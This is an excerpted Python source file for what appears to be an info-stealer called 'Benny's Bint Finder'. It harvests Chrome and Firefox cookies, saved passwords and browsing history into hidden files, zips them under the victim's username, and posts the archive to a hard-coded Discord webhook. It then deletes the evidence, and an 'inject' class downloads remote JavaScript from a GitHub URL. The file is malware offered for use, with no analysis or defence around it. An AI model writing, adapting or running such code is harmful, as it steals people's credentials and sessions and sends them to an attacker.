...
__WEBHOOK__ = "https://discordapp.com/api/webhooks/1008436166133022722/MSYeJ5u1d5uGoutXkp7p5coEQH5fPX36JQjgFloXM4o-hy5Lna-O-sCrqeKo3aN3cG4W"
__PING__ = True
__PINGTYPE__ = "here"
...
def main(webhook: str):
    ...
    embed = Embed(title="Benny's Bint Finder", color=3629544)
    ...
    _file = None
    _file = File(f'Logged-Info-{os.getenv("Username")}.zip')
    ...
    webhook.send(
        ...
        embed=embed,
        file=_file,
        avatar_url="https://cdn.discordapp.com/attachments/997455140133011486/1008448542832066570/Benny1.jpg",
        username="Benny")


def Benny(webhook: str):
    debug()
    ...
    def cookies(self):
        ...
        with open(".\\google-cookies.txt", "w", encoding="utf-8") as f:
            ...
            for cookie in response.cookies:
                f.write("""\n{
    "name": """ + cookie.name+""",""""\n")
                f.write("""    "value":  """ +quo+cookie.value+quo+""",""""\n")
                f.write("""    "domain": """ +quo+cookie.domain+quo+""",""""\n")
                f.write("""    "hostOnly": false,""""\n")
                f.write("""    "path": """+quo+"""/"""+quo+""",""""\n")
                f.write("""    "secure": true,""""\n")
                f.write("""    "httpOnly": false,""""\n")
                f.write("""    "sameSite": """+quo+"""lax"""+quo+""",""""\n")
                f.write("""    "session": false,""""\n")
                f.write("""    "firstPartyDomain": """+quo+quo+""",""""\n")
                f.write("""    "partitionKey": null,""""\n")
                f.write("""    "expirationDate": """ +quo+str(cookie.expires)+quo+""",""""\n")
                f.write(str("""    "storeId": null""""""\n},"""))


                hide("google-cookies.txt")

    def cookies2(self):
        with open(".\\FireFox-cookies.txt", "w", encoding="utf-8") as f:
        ...
        for path in self.google_paths:
            ...
            if os.path.exists(path):
                ...
                if(firefox!=None) and (len(firefox)!=0):
                    ...
                    hide("FireFox-cookies.txt")

    def history(self):
        with open(".\\google-history.txt", "w", encoding="utf-8") as f:
            f.write("Google Chrome History\n\n")
...
def zipup():
    with ZipFile(f'Logged-Info-{os.getenv("Username")}.zip', 'w') as zipf:
        zipf.write("google-passwords.txt")
        zipf.write("google-cookies.txt")
        zipf.write("firefox-cookies.txt")
...
def cleanup():
    for clean in [os.remove("google-passwords.txt"),
                  ...
                  os.remove(f"Logged-Info-{os.getenv('Username')}.zip")]:
        try:
            clean()
        except Exception:
            pass
...
class inject:
    def __init__(self, webhook: str):
        ...
        self.code = requests.get(
            "https://raw.githubusercontent.com/4vrarerontik/i9bsl-SIspp-b-s-Sbvxu7oa/main/truiNErnj3x.js").text
